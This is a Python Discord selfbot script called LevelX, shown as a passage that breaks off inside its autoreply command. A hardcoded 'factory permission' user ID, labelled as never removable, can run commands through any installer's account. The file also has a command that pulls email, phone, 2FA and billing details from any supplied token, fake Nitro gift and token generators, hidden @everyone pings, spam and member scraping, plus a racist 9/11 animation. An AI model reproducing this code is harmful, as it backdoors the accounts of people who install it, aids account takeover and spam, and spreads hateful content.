import discord
from discord.ext import commands
import ctypes
import json
import os
import random
import requests
import asyncio
import string
import time
import datetime
from colorama import Fore
import platform
import itertools
from gtts import gTTS
import io
import qrcode
import pyfiglet


print("""
     \x1b[38;5;33m ██   \x1b[38;5;39m ██████ \x1b[38;5;33m ██   ██ \x1b[38;5;39m ██████ \x1b[38;5;33m ██      \x1b[38;5;39m ██   ██
     \x1b[38;5;33m ██   \x1b[38;5;39m ██      \x1b[38;5;33m ██   ██ \x1b[38;5;39m ██      \x1b[38;5;33m ██       \x1b[38;5;39m ██ ██ 
     \x1b[38;5;33m ██   \x1b[38;5;39m █████   \x1b[38;5;33m  ██ ██  \x1b[38;5;39m █████   \x1b[38;5;33m ██        \x1b[38;5;39m ███  
     \x1b[38;5;33m ██   \x1b[38;5;39m ██       \x1b[38;5;33m  ██ ██  \x1b[38;5;39m ██      \x1b[38;5;33m ██       \x1b[38;5;39m ██ ██ 
     \x1b[38;5;33m ████ \x1b[38;5;39m ██████   \x1b[38;5;33m  ██    \x1b[38;5;39m ██████  \x1b[38;5;33m ██████  \x1b[38;5;39m ██   ██
\x1b[38;5;255m                    Developer by Tio Sunn'212
                                                   \n""")

# Tentar ler token de variável de ambiente primeiro, depois do input se necessário
system = os.getenv('DISCORD_TOKEN')
if not system:
    try:
        system = input("Enter Token: ")
    except (EOFError, KeyboardInterrupt):
        print("❌ Token não fornecido. Use variável de ambiente DISCORD_TOKEN ou rode no console.")
        print("💡 Para usar variável de ambiente:")
        print("   export DISCORD_TOKEN='seu_token_aqui'")
        print("   python main.py")
        exit(1)

y = Fore.LIGHTYELLOW_EX
b = Fore.LIGHTBLUE_EX
w = Fore.LIGHTWHITE_EX

__version__ = "3.2"

start_time = datetime.datetime.now(datetime.timezone.utc)

with open("config/config.json", "r") as file:
    config = json.load(file)
    token = system
    prefix = config.get("prefix")
    message_generator = itertools.cycle(config["autoreply"]["messages"])

def save_config(config_data):
    with open("config/config.json", "w") as file:
        json.dump(config_data, file, indent=4)

# IDs com permissões PERMANENTES DE FÁBRICA (NUNCA podem ser removidos)
FACTORY_PERMISSIONS = [1368365230794473474]

def reload_config():
    """Recarrega a configuração do arquivo"""
    global config
    with open("config/config.json", "r") as file:
        config = json.load(file)
    normalize_config_ids()

def normalize_config_ids():
    """Normaliza todos os IDs nas listas importantes para int"""
    global config
    for key in ["authorized-users", "remote-users", "copycat", "autoreply"]:
        if key in config:
            if key == "copycat" and "users" in config[key]:
                # Para copycat, os IDs estão em config["copycat"]["users"]
                newlist = []
                for v in config[key]["users"]:
                    try:
                        newlist.append(int(v))
                    except:
                        try:
                            newlist.append(v)
                        except:
                            pass
                config[key]["users"] = newlist
            elif key == "autoreply":
                # Para autoreply, os IDs estão em config["autoreply"]["users"] e config["autoreply"]["channels"]
                for subkey in ["users", "channels"]:
                    if subkey in config[key]:
                        newlist = []
                        for v in config[key][subkey]:
                            try:
                                newlist.append(int(v))
                            except:
                                try:
                                    newlist.append(v)
                                except:
                                    pass
                        config[key][subkey] = newlist
            else:
                # Para listas simples como authorized-users e remote-users
                newlist = []
                for v in config[key]:
                    try:
                        newlist.append(int(v))
                    except:
                        try:
                            newlist.append(v)
                        except:
                            pass
                config[key] = newlist

# Normalizar IDs logo após definir a função
normalize_config_ids()

def has_permission(user_id):
    """Verifica se o usuário tem permissão (inclui permissões de fábrica)"""
    # Converter para int para garantir comparação correta
    try:
        user_id = int(user_id)
    except (ValueError, TypeError):
        return False
    
    # Verificar permissões de fábrica
    if user_id in FACTORY_PERMISSIONS:
        return True
    
    # Verificar usuários autorizados (convertendo para int se necessário)
    authorized_users = config.get("authorized-users", [])
    for auth_id in authorized_users:
        try:
            if int(auth_id) == user_id:
                return True
        except (ValueError, TypeError):
            continue
    
    return False

async def safe_delete_message(message):
    """Deleta mensagem com segurança, evitando crashes quando não há permissão"""
    try:
        # Só tenta deletar se for a própria conta ou se tiver permissão
        if message.author.id == bot.user.id:
            await message.delete()
    except (discord.Forbidden, discord.HTTPException, discord.NotFound):
        pass  # Ignora erros de permissão/mensagem não encontrada

def dev_msg(message):
    """Adiciona a tag do desenvolvedor no início da mensagem"""
    return f"**Developer by Tio Sunn'212**\n{message}"

def create_embed(title, description="", color=0x3498db):
    """Cria uma embed azul padronizada com o desenvolvedor"""
    embed = discord.Embed(
        title=f"🎭 {title}",
        description=description,
        color=color
    )
    embed.set_footer(text="👑 LevelX System - Developer by Tio Sunn'212", icon_url="https://cdn.discordapp.com/emojis/1234567890/crown.png")
    return embed

def create_success_embed(title, description=""):
    """Cria uma embed de sucesso verde"""
    embed = discord.Embed(
        title=f"✅ {title}",
        description=description,
        color=0x2ecc71
    )
    embed.set_footer(text="👑 LevelX System - Developer by Tio Sunn'212")
    return embed

def create_error_embed(title, description=""):
    """Cria uma embed de erro vermelha"""
    embed = discord.Embed(
        title=f"❌ {title}",
        description=description,
        color=0xe74c3c
    )
    embed.set_footer(text="👑 LevelX System - Developer by Tio Sunn'212")
    return embed

def selfbot_menu(bot):
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')
    print(f"""\n{Fore.RESET}
\x1b[38;5;33m ██   \x1b[38;5;39m ██████ \x1b[38;5;33m ██   ██ \x1b[38;5;39m ██████ \x1b[38;5;33m ██      \x1b[38;5;39m ██   ██
\x1b[38;5;33m ██   \x1b[38;5;39m ██      \x1b[38;5;33m ██   ██ \x1b[38;5;39m ██      \x1b[38;5;33m ██       \x1b[38;5;39m ██ ██ 
\x1b[38;5;33m ██   \x1b[38;5;39m █████   \x1b[38;5;33m  ██ ██  \x1b[38;5;39m █████   \x1b[38;5;33m ██        \x1b[38;5;39m ███  
\x1b[38;5;33m ██   \x1b[38;5;39m ██       \x1b[38;5;33m  ██ ██  \x1b[38;5;39m ██      \x1b[38;5;33m ██       \x1b[38;5;39m ██ ██ 
\x1b[38;5;33m ████ \x1b[38;5;39m ██████   \x1b[38;5;33m  ██    \x1b[38;5;39m ██████  \x1b[38;5;33m ██████  \x1b[38;5;39m ██   ██
\x1b[38;5;255m                    Developer by Tio Sunn'212
                                                        \n""")

    print(f"""
    https://discord.gg/v2QwrUPUzk
 Linked --> \x1b[38;5;33m {bot.user} \x1b[38;5;255m 
 LevelX Prefix -->\x1b[38;5;33m {prefix}\x1b[38;5;255m
 Nitro Sniper --> \x1b[38;5;48m Enabled \x1b[38;5;255m
 Extra Commands --> \x1b[38;5;48m Enabled \x1b[38;5;255m
 Anti-Ban --> \x1b[38;5;48m Enabled \x1b[38;5;255m
 """)




bot = commands.Bot(command_prefix=prefix, description='not a selfbot', self_bot=True, help_command=None)

@bot.event
async def on_ready():
    if platform.system() == "Windows":
        ctypes.windll.kernel32.SetConsoleTitleW(f"LevelX v{__version__} - Developer by Tio Sunn'212")
        os.system('cls')
    else:
        os.system('clear')
    selfbot_menu(bot)

@bot.event
async def on_message(message):
    if message.author.id in config["copycat"]["users"]:
        if message.content.startswith(config['prefix']):
            response_message = message.content[len(config['prefix']):]
            await message.reply(response_message)
        else:
            await message.reply(message.content)

    if config["afk"]["enabled"]:
        if bot.user in message.mentions and message.author != bot.user:
            await message.reply(config["afk"]["message"])
            return
        elif isinstance(message.channel, discord.DMChannel) and message.author != bot.user:
            await message.reply(config["afk"]["message"])
            return

    if message.author != bot.user:
        if str(message.author.id) in config["autoreply"]["users"]:
            autoreply_message = next(message_generator)
            await message.reply(autoreply_message)
            return
        elif str(message.channel.id) in config["autoreply"]["channels"]:
            autoreply_message = next(message_generator)
            await message.reply(autoreply_message)
            return

    if message.guild and message.guild.id == 1279905004181917808 and message.content.startswith(config['prefix']):
        await message.delete()
        await message.channel.send("> SelfBot commands are not allowed here. Thanks.", delete_after=5)
        return

    # Verificar se existe uma sessão esperando input do painel
    for msg_id, session in list(painel_sessions.items()):
        if (session.get("waiting_for") and 
            message.author.id == session["user_id"] and 
            message.channel.id == session["channel"].id):
            
            try:
                # Deletar mensagem do usuário
                await message.delete()
                
                # Processar input baseado no tipo esperado
                await process_painel_input(msg_id, session, message.content)
                
            except Exception as e:
                error_embed = create_error_embed(
                    "ERRO NO PROCESSAMENTO",
                    f"❌ **Erro inesperado:** {str(e)}\n\n"
                    "Tente novamente ou volte ao menu principal."
                )
                await message.channel.send(embed=error_embed, delete_after=5)
            
            return  # Não processar como comando normal

    # Verificar se é um comando com prefixo
    if not message.content.startswith(prefix):
        return
    
    # Verificar se o usuário tem permissão para usar comandos
    if not has_permission(message.author.id):
        return

    # CORREÇÃO: Discord.py self-bot só processa comandos da própria conta
    # Para outras contas autorizadas, precisamos processar manualmente
    try:
        # Se for a própria conta do bot, usa o método normal
        if message.author.id == bot.user.id:
            ctx = await bot.get_context(message)
            if ctx.command is not None:
                await bot.invoke(ctx)
        else:
            # Para usuários autorizados, criar contexto artificialmente
            # Obter o comando a partir do conteúdo da mensagem
            command_name = message.content[len(prefix):].split()[0].lower()
            command = bot.get_command(command_name)
            
            if command is not None:
                # Criar um contexto fake para o usuário autorizado
                ctx = await bot.get_context(message)
                ctx.command = command
                
                # Executar o comando
                await bot.invoke(ctx)
            else:
                # Se comando não encontrado, não fazer nada (silencioso)
                pass
                
    except Exception as e:
        print(f"[ERROR] Erro ao processar comando: {e}")
        # Para debug, vamos também mostrar os detalhes do erro
        import traceback
        print(f"[DEBUG] Traceback: {traceback.format_exc()}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return


@bot.command(aliases=['h'])
async def help(ctx):
    await safe_delete_message(ctx.message)

    help_text = f"""```
════════════════════════════════════
           LEVELX SELFBOT HELP
════════════════════════════════════
Prefix: {prefix}
```
**COMANDOS BÁSICOS:**
> `{prefix}help` - Mostra esta lista de comandos
> `{prefix}levelx` - Redes sociais do desenvolvedor  
> `{prefix}uptime` - Tempo online do bot
> `{prefix}ping` - Latência do bot
> `{prefix}shutdown` - Desligar o bot

**MODERAÇÃO:** *(Apenas usuários autorizados)*
> `{prefix}puxar <ID_CARGO>` - Puxa membros de um cargo para seu canal
> `{prefix}setnick <ID_CARGO> <NOME>` - Renomeia todos de um cargo 
> `{prefix}marcar <ID_CARGO>` - Menciona todos de um cargo
> `{prefix}reset` - Lista backups de nomes disponíveis
> `{prefix}resetar <NÚMERO>` - Restaura backup específico

**PERMISSÕES:** *(Apenas usuários autorizados)*
> `{prefix}addperm <ID_USUÁRIO>` - Adiciona permissão a um usuário
> `{prefix}removerperm <ID_USUÁRIO>` - Remove permissão de um usuário

**UTILITÁRIOS:**
> `{prefix}changeprefix <prefix>` - Muda o prefixo do bot
> `{prefix}tts <texto>` - Converte texto em áudio
> `{prefix}qr <texto>` - Gera QR code
> `{prefix}geoip <ip>` - Localização de IP
> `{prefix}pingweb <url>` - Testa site online
> `{prefix}purge <quantidade>` - Apaga mensagens
> `{prefix}clear` - Limpa canal
> `{prefix}gentoken` - Gera token fake
> `{prefix}reverse <texto>` - Inverte texto

```
Developer by Tio Sunn'212
```"""
    await ctx.send(help_text)



@bot.command()
async def uptime(ctx):
    await safe_delete_message(ctx.message)

    now = datetime.datetime.now(datetime.timezone.utc)
    delta = now - start_time
    hours, remainder = divmod(int(delta.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    days, hours = divmod(hours, 24)

    if days:
        time_format = "**{d}** days, **{h}** hours, **{m}** minutes, and **{s}** seconds."
    else:
        time_format = "**{h}** hours, **{m}** minutes, and **{s}** seconds."

    uptime_stamp = time_format.format(d=days, h=hours, m=minutes, s=seconds)

    await ctx.send(dev_msg(uptime_stamp))

@bot.command()
async def ping(ctx):
    await safe_delete_message(ctx.message)

    before = time.monotonic()
    message_to_send = await ctx.send("Pinging...")

    await message_to_send.edit(content=f"`{int((time.monotonic() - before) * 1000)} ms`")

@bot.command(aliases=['plasma'])
async def levelx(ctx):
    await safe_delete_message(ctx.message)

    embed = f"""Developer by Tio Sunn'212\nhttps://replit.com/@easyselfbots/LevelX-Selfbot-300-Commands-Working-2025#main.py"""

    await ctx.send(embed)


@bot.command()
async def geoip(ctx, ip: str=None):
    await safe_delete_message(ctx.message)

    if not ip:
        await ctx.send("> **[ERROR]**: Invalid command.\n> __Command__: `geoip <ip>`", delete_after=5)
        return

    try:
        r = requests.get(f'http://ip-api.com/json/{ip}')
        geo = r.json()
        embed = f"""**GEOLOCATE IP | Prefix: `{prefix}`**\n
        > :pushpin: `IP`\n*{geo['query']}*
        > :globe_with_meridians: `Country-Region`\n*{geo['country']} - {geo['regionName']}*
        > :department_store: `City`\n*{geo['city']} ({geo['zip']})*
        > :map: `Latitute-Longitude`\n*{geo['lat']} - {geo['lon']}*
        > :satellite: `ISP`\n*{geo['isp']}*
        > :robot: `Org`\n*{geo['org']}*
        > :alarm_clock: `Timezone`\n*{geo['timezone']}*
        > :electric_plug: `As`\n*{geo['as']}*"""
        await ctx.send(embed)
    except Exception as e:
        await ctx.send(f'> **[**ERROR**]**: Unable to geolocate ip\n> __Error__: `{str(e)}`', delete_after=5)


@bot.command()
async def tts(ctx, *, content: str=None):
    await ctx.message.delete()

    if not content:
        await ctx.send("> **[ERROR]**: Invalid command.\n> __Command__: `tts <message>`", delete_after=5)
        return

    content = content.strip()

    tts = gTTS(text=content, lang="en")

    f = io.BytesIO()
    tts.write_to_fp(f)
    f.seek(0)

    await ctx.send(file=discord.File(f, f"{content[:10]}.wav"))

@bot.command(aliases=['qrcode'])
async def qr(ctx, *, text: str="https://discord.gg/PKR7nM9j9U"):
    qr = qrcode.make(text)

    img_byte_arr = io.BytesIO()
    qr.save(img_byte_arr)
    img_byte_arr.seek(0)



    await ctx.send(file=discord.File(img_byte_arr, "qr_code.png"))

@bot.command()
async def pingweb(ctx, website_url: str=None):
    await ctx.message.delete()

    if not website_url:
        await ctx.send("> **[ERROR]**: Invalid command.\n> __Command__: `pingweb <url>`", delete_after=5)
        return

    try:
        r = requests.get(website_url).status_code
        if r == 404:
            await ctx.send(f'> Website **down** *({r})*')
        else:
            await ctx.send(f'> Website **operational** *({r})*')
    except Exception as e:
        await ctx.send(f'> **[**ERROR**]**: Unable to ping website\n> __Error__: `{str(e)}`', delete_after=5)

@bot.command()
async def gentoken(ctx, user: str=None):
    await ctx.message.delete()

    code = "ODA"+random.choice(string.ascii_letters)+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(20))+"."+random.choice(string.ascii_letters).upper()+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))+"."+''.join(random.choice(string.ascii_letters + string.digits) for _ in range(27))

    if not user:
        await ctx.send(''.join(code))
    else:
        await ctx.send(f"> {user}'s token is: ||{''.join(code)}||")

@bot.command()
async def quickdelete(ctx, *, message: str=None):
    await ctx.message.delete()

    if not message:
        await ctx.send(f'> **[**ERROR**]**: Invalid input\n> __Command__: `quickdelete <message>`', delete_after=2)
        return

    await ctx.send(message, delete_after=2)

@bot.command(aliases=['uicon'])
async def usericon(ctx, user: discord.User = None):
    await ctx.message.delete()

    if not user:
        await ctx.send(f'> **[**ERROR**]**: Invalid input\n> __Command__: `usericon <@user>`', delete_after=5)
        return
    avatar_url = user.avatar.url if user.avatar else user.default_avatar.url

    await ctx.send(f"> {user.mention}'s avatar:\n{avatar_url}")


@bot.command(aliases=['tinfo'])
async def tokeninfo(ctx, usertoken: str=None):
    await ctx.message.delete()

    if not usertoken:
        await ctx.send(f'> **[**ERROR**]**: Invalid input\n> __Command__: `tokeninfo <token>`', delete_after=5)
        return

    headers = {'Authorization': usertoken, 'Content-Type': 'application/json'}
    languages = {
        'da': 'Danish, Denmark',
        'de': 'German, Germany',
        'en-GB': 'English, United Kingdom',
        'en-US': 'English, United States',
        'es-ES': 'Spanish, Spain',
        'fr': 'French, France',
        'hr': 'Croatian, Croatia',
        'lt': 'Lithuanian, Lithuania',
        'hu': 'Hungarian, Hungary',
        'nl': 'Dutch, Netherlands',
        'no': 'Norwegian, Norway',
        'pl': 'Polish, Poland',
        'pt-BR': 'Portuguese, Brazilian, Brazil',
        'ro': 'Romanian, Romania',
        'fi': 'Finnish, Finland',
        'sv-SE': 'Swedish, Sweden',
        'vi': 'Vietnamese, Vietnam',
        'tr': 'Turkish, Turkey',
        'cs': 'Czech, Czechia, Czech Republic',
        'el': 'Greek, Greece',
        'bg': 'Bulgarian, Bulgaria',
        'ru': 'Russian, Russia',
        'uk': 'Ukrainian, Ukraine',
        'th': 'Thai, Thailand',
        'zh-CN': 'Chinese, China',
        'ja': 'Japanese',
        'zh-TW': 'Chinese, Taiwan',
        'ko': 'Korean, Korea'
    }

    try:
        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
        res.raise_for_status()
    except requests.exceptions.RequestException as e:
        await ctx.send(f'> **[**ERROR**]**: An error occurred while sending request\n> __Error__: `{str(e)}`', delete_after=5)
        return

    if res.status_code == 200:
        res_json = res.json()
        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
        user_id = res_json['id']
        avatar_id = res_json['avatar']
        avatar_url = f'https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}.gif'
        phone_number = res_json['phone']
        email = res_json['email']
        mfa_enabled = res_json['mfa_enabled']
        flags = res_json['flags']
        locale = res_json['locale']
        verified = res_json['verified']
        days_left = ""
        language = languages.get(locale)
        creation_date = datetime.datetime.fromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
        has_nitro = False

        try:
            nitro_res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
            nitro_res.raise_for_status()
            nitro_data = nitro_res.json()
            has_nitro = bool(len(nitro_data) > 0)
            if has_nitro:
                d1 = datetime.datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                d2 = datetime.datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                days_left = abs((d2 - d1).days)
        except requests.exceptions.RequestException as e:
            pass

        try:
            embed = f"""**TOKEN INFORMATIONS | Prefix: `{prefix}`**\n
        > :dividers: __Basic Information__\n\tUsername: `{user_name}`\n\tUser ID: `{user_id}`\n\tCreation Date: `{creation_date}`\n\tAvatar URL: `{avatar_url if avatar_id else "None"}`
        > :crystal_ball: __Nitro Information__\n\tNitro Status: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`
        > :incoming_envelope: __Contact Information__\n\tPhone Number: `{phone_number if phone_number else "None"}`\n\tEmail: `{email if email else "None"}`
        > :shield: __Account Security__\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tFlags: `{flags}`
        > :paperclip: __Other__\n\tLocale: `{locale} ({language})`\n\tEmail Verified: `{verified}`"""

            await ctx.send(embed)
        except Exception as e:
            await ctx.send(f'> **[**ERROR**]**: Unable to recover token infos\n> __Error__: `{str(e)}`', delete_after=5)
    else:
        await ctx.send(f'> **[**ERROR**]**: Unable to recover token infos\n> __Error__: Invalid token', delete_after=5)

@bot.command()
async def cleardm(ctx, amount: str="1"):
    await ctx.message.delete()

    if not amount.isdigit():
        await ctx.send(f'> **[**ERROR**]**: Invalid amount specified. It must be a number.\n> __Command__: `{config["prefix"]}cleardm <amount>`', delete_after=5)
        return

    amount = int(amount)

    if amount <= 0 or amount > 100:
        await ctx.send(f'> **[**ERROR**]**: Amount must be between 1 and 100.', delete_after=5)
        return

    if not isinstance(ctx.channel, discord.DMChannel):
        await ctx.send(f'> **[**ERROR**]**: This command can only be used in DMs.', delete_after=5)
        return

    deleted_count = 0
    async for message in ctx.channel.history(limit=amount):
        if message.author == bot.user:
            try:
                await message.delete()
                deleted_count += 1
            except discord.Forbidden:
                await ctx.send(f'> **[**ERROR**]**: Missing permissions to delete messages.', delete_after=5)
                return
            except discord.HTTPException as e:
                await ctx.send(f'> **[**ERROR**]**: An error occurred while deleting messages: {str(e)}', delete_after=5)
                return

    await ctx.send(f'> **Cleared {deleted_count} messages in DMs.**', delete_after=5)


@bot.command(aliases=['hs'])
async def hypesquad(ctx, house: str=None):
    await ctx.message.delete()

    if not house:
        await ctx.send(f'> **[**ERROR**]**: Invalid input\n> __Command__: `hypesquad <house>`', delete_after=5)
        return

    headers = {'Authorization': token, 'Content-Type': 'application/json'}

    try:
        r = requests.get('https://discord.com/api/v8/users/@me', headers=headers)
        r.raise_for_status()
    except requests.exceptions.RequestException as e:
        await ctx.send(f'> **[**ERROR**]**: Invalid status code\n> __Error__: `{str(e)}`', delete_after=5)
        return

    headers = {'Authorization': token, 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
    payload = {}
    if house == "bravery":
        payload = {'house_id': 1}
    elif house == "brilliance":
        payload = {'house_id': 2}
    elif house == "balance":
        payload = {'house_id': 3}
    else:
        await ctx.send(f'> **[**ERROR**]**: Invalid input\n> __Error__: Hypesquad house must be one of the following: `bravery`, `brilliance`, `balance`', delete_after=5)
        return

    try:
        r = requests.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
        r.raise_for_status()

        if r.status_code == 204:
            await ctx.send(f'> Hypesquad House changed to `{house}`!')

    except requests.exceptions.RequestException as e:
        await ctx.send(f'> **[**ERROR**]**: Unable to change Hypesquad house\n> __Error__: `{str(e)}`', delete_after=5)

@bot.command(aliases=['ginfo'])
async def guildinfo(ctx):
    await ctx.message.delete()

    if not ctx.guild:
        await ctx.send("> **[**ERROR**]**: This command can only be used in a server", delete_after=5)
        return

    date_format = "%a, %d %b %Y %I:%M %p"
    embed = f"""> **GUILD INFORMATIONS | Prefix: `{prefix}`**
:dividers: __Basic Information__
Server Name: `{ctx.guild.name}`\nServer ID: `{ctx.guild.id}`\nCreation Date: `{ctx.guild.created_at.strftime(date_format)}`\nServer Icon: `{ctx.guild.icon.url if ctx.guild.icon.url else 'None'}`\nServer Owner: `{ctx.guild.owner}`
:page_facing_up: __Other Information__
`{len(ctx.guild.members)}` Members\n`{len(ctx.guild.roles)}` Roles\n`{len(ctx.guild.text_channels) if ctx.guild.text_channels else 'None'}` Text-Channels\n`{len(ctx.guild.voice_channels) if ctx.guild.voice_channels else 'None'}` Voice-Channels\n`{len(ctx.guild.categories) if ctx.guild.categories else 'None'}` Categories"""

    await ctx.send(embed)

@bot.command()
async def nitro(ctx):
    await ctx.message.delete()

    await ctx.send(f"https://discord.gift/{''.join(random.choices(string.ascii_letters + string.digits, k=16))}")

@bot.command()
async def whremove(ctx, webhook: str=None):
    await ctx.message.delete()

    if not webhook:
        await ctx.send(f'> **[**ERROR**]**: Invalid input\n> __Command__: `{prefix}whremove <webhook>`', delete_after=5)
        return

    try:
        requests.delete(webhook.rstrip())
    except Exception as e:
        await ctx.send(f'> **[**ERROR**]**: Unable to delete webhook\n> __Error__: `{str(e)}`', delete_after=5)
        return

    await ctx.send(f'> Webhook has been deleted!')

@bot.command(aliases=['hide'])
async def hidemention(ctx, *, content: str=None):
    await ctx.message.delete()

    if not content:
        await ctx.send(f'> **[**ERROR**]**: Invalid input\n> __Command__: `{prefix}hidemention <message>`', delete_after=5)
        return

    await ctx.send(content + ('||\u200b||' * 200) + '@everyone')

@bot.command()
async def edit(ctx, *, content: str=None):
    await ctx.message.delete()

    if not content:
        await ctx.send(f'> **[**ERROR**]**: Invalid input\n> __Command__: `{prefix}edit <message>`', delete_after=5)
        return

    text = await ctx.send(content)

    await text.edit(content=f"\u202b{content}")

@bot.command(aliases=['911'])
async def airplane(ctx):
    await ctx.message.delete()

    frames = [
        f''':man_wearing_turban::airplane:\t\t\t\t:office:''',
        f''':man_wearing_turban:\t:airplane:\t\t\t:office:''',
        f''':man_wearing_turban:\t\t::airplane:\t\t:office:''',
        f''':man_wearing_turban:\t\t\t:airplane:\t:office:''',
        f''':man_wearing_turban:\t\t\t\t:airplane::office:''',
        ''':boom::boom::boom:''']

    sent_message = await ctx.send(frames[0])

    for frame in frames[1:]:
        await asyncio.sleep(0.5)
        await sent_message.edit(content=frame)


@bot.command(aliases=['mine'])
async def minesweeper(ctx, size: int=5):
    await ctx.message.delete()

    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for _ in range(size - 1)]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    m_numbers = [":one:", ":two:", ":three:", ":four:", ":five:", ":six:"]
    m_offsets = [(-1, -1), (0, -1), (1, -1), (-1, 0), (1, 0), (-1, 1), (0, 1), (1, 1)]
    message_to_send = "**Click to play**:\n"

    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offsets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message_to_send += tile
        message_to_send += "\n"

    await ctx.send(message_to_send)

@bot.command(aliases=['leet'])
async def leetspeak(ctx, *, content: str):
    await ctx.message.delete()

    if not content:
        await ctx.send("> **[ERROR]**: Invalid command.\n> __Command__: `leetspeak <message>`", delete_after=5)
        return

    content = content.replace('a', '4').replace('A', '4').replace('e', '3').replace('E', '3').replace('i', '1').replace('I', '1').replace('o', '0').replace('O', '0').replace('t', '7').replace('T', '7').replace('b', '8').replace('B', '8')
    await ctx.send(content)

@bot.command()
async def dick(ctx, user: str=None):
    await ctx.message.delete()

    if not user:
        user = ctx.author.display_name

    size = random.randint(1, 15)
    dong = "=" * size

    await ctx.send(f"> **{user}**'s Dick size\n8{dong}D")

@bot.command()
async def reverse(ctx, *, content: str=None):
    await ctx.message.delete()

    if not content:
        await ctx.send("> **[ERROR]**: Invalid command.\n> __Command__: `reverse <message>`", delete_after=5)
        return

    content = content[::-1]
    await ctx.send(content)

@bot.command(aliases=['fetch'])
async def fetchmembers(ctx):
    await ctx.message.delete()

    if not ctx.guild:
        await ctx.send(f'> **[**ERROR**]**: This command can only be used in a server.', delete_after=5)
        return

    members = ctx.guild.members
    member_data = []

    for member in members:
        member_info = {
            "name": member.name,
            "id": str(member.id),
            "avatar_url": str(member.avatar.url) if member.avatar else str(member.default_avatar.url),
            "discriminator": member.discriminator,
            "status": str(member.status),
            "joined_at": str(member.joined_at)
        }
        member_data.append(member_info)

    with open("members_list.json", "w", encoding="utf-8") as f:
        json.dump(member_data, f, indent=4)

    await ctx.send("> List of members:", file=discord.File("members_list.json"))

    os.remove("members_list.json")

@bot.command()
async def spam(ctx, amount: int=1, *, message_to_send: str="https://discord.gg/PKR7nM9j9U"):
    await ctx.message.delete()

    try:
        if amount <= 0 or amount > 9:
            await ctx.send("> **[**ERROR**]**: Amount must be between 1 and 9", delete_after=5)
            return
        for _ in range(amount):
            await ctx.send(message_to_send)
    except ValueError:
        await ctx.send(f'> **[**ERROR**]**: Invalid input\n> __Command__: `spam <amount> <message>`', delete_after=5)

@bot.command(aliases=['gicon'])
async def guildicon(ctx):
    await ctx.message.delete()

    if not ctx.guild:
        await ctx.send("> **[**ERROR**]**: This command can only be used in a server", delete_after=5)
        return

    await ctx.send(f"> **{ctx.guild.name} icon :**\n{ctx.guild.icon.url if ctx.guild.icon else '*NO ICON*'}")

@bot.command(aliases=['gbanner'])
async def guildbanner(ctx):
    await ctx.message.delete()

    if not ctx.guild:
        await ctx.send("> **[**ERROR**]**: This command can only be used in a server", delete_after=5)
        return

    await ctx.send(f"> **{ctx.guild.name} banner :**\n{ctx.guild.banner.url if ctx.guild.banner else '*NO BANNER*'}")

@bot.command(aliases=['grename'])
async def guildrename(ctx, *, name: str=None):
    await ctx.message.delete()

    if not name:
        await ctx.send("> **[ERROR]**: Invalid command.\n> __Command__: `guildrename <name>`", delete_after=5)
        return

    if not ctx.guild:
        await ctx.send("> **[**ERROR**]**: This command can only be used in a server", delete_after=5)
        return

    if not ctx.guild.me.guild_permissions.manage_guild:
        await ctx.send(f'> **[**ERROR**]**: Missing permissions', delete_after=5)
        return

    try:
        await ctx.guild.edit(name=name)
        await ctx.send(f"> Server renamed to '{name}'")
    except Exception as e:
        await ctx.send(f'> **[**ERROR**]**: Unable to rename the server\n> __Error__: `{str(e)}`, delete_after=5')

@bot.command()
async def purge(ctx, num_messages: int=1):
    await ctx.message.delete()

    if not ctx.guild:
        await ctx.send("> **[**ERROR**]**: This command can only be used in a server", delete_after=5)
        return

    if not ctx.author.guild_permissions.manage_messages:
        await ctx.send("> **[**ERROR**]**: You do not have permission to delete messages", delete_after=5)
        return

    if 1 <= num_messages <= 100:
        deleted_messages = await ctx.channel.purge(limit=num_messages)
        await ctx.send(f"> **{len(deleted_messages)}** messages have been deleted", delete_after=5)
    else:
        await ctx.send("> **[**ERROR**]**: The number must be between 1 and 100", delete_after=5)

@bot.command(aliases=['autor'])
async def autoreply(ctx, command: str, user: discord.User=None):
    await ctx.message.delete()

    if command not in ["ON", "OFF"]:
        await ctx.send(f"> **[**ERROR**]**: Invalid input. Use `ON` or `OFF`.\n> __Command__: `autoreply ON|OFF [@user]`", delete_after=5)
        return

    if command.upper() == "ON":
        if user:
            if str(user.id) not in config["autoreply"]["users"]:
                config["autoreply"]["users"].append(str(user.id))
                save_config(config)
                selfbot_menu(bot)
            await ctx.send(f"> **Autoreply enabled for user {user.mention}.**", delete_after=5)
        else:
            if str(ctx.channel.id) not in config["autoreply"]["channels"]:
                config["autoreply"]["channels"].append(str(ctx.channel.id))
                save_config(config)
                selfbot_menu(bot)
            await ctx.send("> **Autoreply has been enabled in this channel**", delete_after=5)
    elif command.upper() == "OFF":
        if user:
